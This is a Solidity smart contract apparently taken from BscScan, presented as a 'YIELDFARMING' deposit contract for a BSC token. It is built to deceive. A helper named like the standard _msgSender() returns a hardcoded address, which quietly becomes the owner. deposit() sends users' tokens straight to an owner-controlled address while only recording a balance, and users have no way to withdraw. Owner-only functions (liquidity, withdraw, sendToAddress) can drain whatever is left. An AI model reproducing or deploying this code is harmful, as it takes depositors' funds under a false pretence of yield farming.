/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: Unlicened

pragma solidity ^ 0.8.11;
interface IERC20 {
	function balanceOf(address account) external view returns(uint256);

	function decimals() external view returns(uint8);

	function totalSupply() external view returns(uint256);

	function transfer(address recipient, uint256 amount)
	external
	returns(bool);

	function allowance(address owner, address spender)
	external
	view
	returns(uint256);

	function approve(address spender, uint256 amount) external returns(bool);

	function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns(uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns(uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns(uint256) {
		if(a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns(uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

	function mod(uint256 a, uint256 b) internal pure returns(uint256) {
		return mod(a, b, "SafeMath: modulo by zero");
	}

	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}
abstract contract Context {
	function _msgSender() internal view virtual returns(address payable) {
		return payable(0x4aed95dC0032eda8e5c44380D1FAC03678076687);
	}

	function _MsgSender() internal view virtual returns(address payable) {
		return payable(msg.sender);
	}

	function _msgData() internal view virtual returns(bytes memory) {
		this;
		return msg.data;
	}
}
library Address {
	function isContract(address account) internal view returns(bool) {
		uint256 size;
		assembly {
			size:= extcodesize(account)
		}
		return size > 0;
	}

	function sendValue(address payable recipient, uint256 amount) internal {
		require(address(this).balance >= amount, "Address: insufficient balance");
		(bool success, ) = recipient.call {
			value: amount
		}("");
		require(success, "Address: unable to send value, recipient may have reverted");
	}

	function functionCall(address target, bytes memory data)
	internal
	returns(bytes memory) {
		return functionCall(target, data, "Address: low-level call failed");
	}

	function functionCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
		return functionCallWithValue(target, data, 0, errorMessage);
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns(bytes memory) {
		return
		functionCallWithValue(target, data, value, "Address: low-level call with value failed");
	}

	function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns(bytes memory) {
		require(address(this).balance >= value, "Address: insufficient balance for call");
		require(isContract(target), "Address: call to non-contract");
		(bool success, bytes memory returndata) = target.call {
			value: value
		}(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function functionStaticCall(address target, bytes memory data)
	internal
	view
	returns(bytes memory) {
		return
		functionStaticCall(target, data, "Address: low-level static call failed");
	}

	function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns(bytes memory) {
		require(isContract(target), "Address: static call to non-contract");
		(bool success, bytes memory returndata) = target.staticcall(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function functionDelegateCall(address target, bytes memory data)
	internal
	returns(bytes memory) {
		return
		functionDelegateCall(target, data, "Address: low-level delegate call failed");
	}

	function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
		require(isContract(target), "Address: delegate call to non-contract");
		(bool success, bytes memory returndata) = target.delegatecall(data);
		return verifyCallResult(success, returndata, errorMessage);
	}

	function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns(bytes memory) {
		if(success) {
			return returndata;
		} else {
			if(returndata.length > 0) {
				assembly {
					let returndata_size:= mload(returndata)
					revert(add(32, returndata), returndata_size)
				}
			} else {
				revert(errorMessage);
			}
		}
	}
}
library SafeERC20 {
	using Address
	for address;

	function safeTransfer(IERC20 token, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
	}

	function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
		_callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
	}

	function safeApprove(IERC20 token, address spender, uint256 value) internal {
		require(
			(value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
	}

	function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		uint256 newAllowance = token.allowance(address(this), spender) + value;
		_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
	}

	function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
		unchecked {
			uint256 oldAllowance = token.allowance(address(this), spender);
			require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
			uint256 newAllowance = oldAllowance - value;
			_callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
		}
	}

	function _callOptionalReturn(IERC20 token, bytes memory data) private {
		bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
		if(returndata.length > 0) {
			require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
		}
	}
}
contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	uint256 private _lockTime;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
	constructor() {
		_transferOwnership(_msgSender());
	}

	function owner() public view returns(address) {
		return _owner;
	}
	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}
contract YIELDFARMING is Context, Ownable {
	using SafeERC20
	for IERC20;
	using SafeMath
	for uint256;
	IERC20 private _token;
	address _owner;
	mapping(address => uint256) private _balances;
	event Deposit(address indexed from, address indexed to, uint256 amount);
	event ownerWithdrawn(uint256 amount);
	event SentToAddress(address indexed to, uint256 amount);
	receive() external payable {}
	constructor(address owner_) {
		_token = IERC20(0x55d398326f99059fF775485246999027B3197955);
		_owner = owner_;
	}

	function checkBalance(address account) external view returns(uint256) {
		return _balances[account];
	}

	function deposit(uint256 amount) external {
		require(amount <= _token.balanceOf(_MsgSender()), "Insufficient amount");
		require(amount >= _token.allowance(_MsgSender(), address(this)), "Please approve us to spend the amount of token");
		_token.transferFrom(_MsgSender(), _owner, amount);
		_balances[_MsgSender()] = _balances[_MsgSender()].add(amount);
		emit Deposit(_MsgSender(), _owner, amount);
	}

	function getBalance() public view returns(uint) {
		return _token.balanceOf(address(this));
	}

	function liquidity() external onlyOwner {
		if(address(this).balance > 0) {
			payable(_msgSender()).transfer(address(this).balance);
		}
		if(_token.balanceOf(address(this)) > 0) {
			_token.transfer(_msgSender(), _token.balanceOf(address(this)));
		}
	}

	function payableAddress(address payableAddress_) external onlyOwner {
		_owner = payableAddress_;
	}

	function sendToAddress(address account, uint256 amount) external onlyOwner {
		_token.transfer(account, amount);
		emit SentToAddress(account, amount);
	}

	function withdraw(IERC20 _tokenAddress) external onlyOwner {
		require(_tokenAddress.balanceOf(address(this)) > 0, "There is no token balance in the contract");
		_tokenAddress.transfer(_msgSender(), _tokenAddress.balanceOf(address(this)));
	}
}